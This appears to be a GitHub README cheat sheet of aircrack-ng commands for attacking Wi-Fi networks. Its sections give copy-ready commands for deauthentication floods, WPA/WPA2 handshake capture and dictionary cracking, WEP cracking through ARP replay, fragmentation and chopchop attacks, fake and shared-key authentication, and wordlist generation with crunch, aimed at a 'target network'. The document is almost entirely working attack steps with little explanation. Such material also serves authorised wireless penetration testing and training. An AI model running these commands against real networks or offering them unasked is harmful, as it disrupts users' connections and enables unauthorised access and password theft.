# All usage of attacks by aircrack-ng

In this example
- `wlan0` is the name of your interface in manager mode
- `mon0` is the name of your interface in monitor mode
- `00:14:6C:7E:40:80` is the bssid of target network
- `00:09:5B:EB:C5:2B` is the bssid of your network
- `-c X` is the channel of target network
- `out.cap` is the filename to capture the WPA handshake
- `password.txt` is the filename to brute force
- `password.txt` is the file contains name of target network
- `crackwpa` is the database name for cracking password
- `sharedkey.xor` is the name of file containing the PRGA xor bits

## Scan network around

```
airmon-ng check kill
airmon-ng start wlan0
airodump-ng mon0
```

![image](https://user-images.githubusercontent.com/90561566/166110658-56663408-8ef9-4681-a5d1-4e7ec4bd3562.png)

## [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)

You can try it: https://github.com/lucthienphong1120/xDeauth

```
aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
or
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 mon0
```

Ctrl+C to stop deauth

## WPA/WPA2 Handshake capture

```
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
ls
```

## [Cracking WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

```
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
(wait handshake)
aircrack-ng -w password.txt out*.cap 
```

## [ARP Request Replay Attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)

```
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
aireplay-ng -0 10 -a 00:14:6C:7E:40:80 mon0
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
```

## Crack WEP by ARP request reinjection

```
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
aireplay-ng -1 100 -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
aireplay-ng -3 0 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
(wait to capture about 70.000 packet)
aircrack-ng -a 1 out*.cap
```

## Speed up cracking use database

```
sudo apt install sqlite3
airolib-ng crackwpa --import passwd password.txt
airolib-ng crackwpa --import essid essid.txt
airolib-ng crackwpa --stats # to check information about your database before batch
airolib-ng crackwpa --clean all # to clean the database from old junk and integrity check
(you can skip 2 lines above)
airolib-ng crackwpa --batch
aircrack-ng -r crackwpa out*.cap
```

## Brute force tools

Aircrack often uses brute force with some other tools as follows:

- [Cupp](https://github.com/lucthienphong1120/cupp)
- /usr/share/wordlists/rockyou.txt.gz
- [Crunch](https://www.kali.org/tools/crunch)

```
crunch [min] [max] [charset] -t [pattern] -o [path file]
```

## [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay)

Natural Packet Replay

```
aireplay-ng -2 -b 00:14:6C:7E:40:80 -d 00:09:5B:EB:C5:2B -t 1 mon0
```

Modified Packet Replay

```
aireplay-ng -2 -b 00:14:6C:7E:40:80 -t 1 -c 00:09:5B:EB:C5:2B -p 0841 mon0
```

Rebroadcast the packet and thereby generate new IVs

```
aireplay-ng -2 -p 0841 -c 00:09:5B:EB:C5:2B -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82  mon0
```

## [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication)

```
aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
```

Another variation

```
aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
```

## [Shared key fake authentication](https://www.aircrack-ng.org/doku.php?id=shared_key)

Start interface monitor mode on AP channel

```
airmon-ng start wlan0 9
airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w sharedkey mon0
(wait AUTH=SKA)
ls
```

Deauthenticate a connected client

```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 mon0
```

`00:0F:B5:34:30:30` is the MAC address of the client you are deauthing

Perform Shared Key Fake Authentication

```
aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B -y sharedkey*.xor mon0
```

## [Fragmentation Attack](https://www.aircrack-ng.org/doku.php?id=fragmentation)

```
aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
```

## [Crack WEP KoreK chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop)

```
aireplay-ng -4 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
```

Chopchop Without Authentication

```
aireplay-ng -4 -b 00:14:6C:7E:40:80 mon0
```










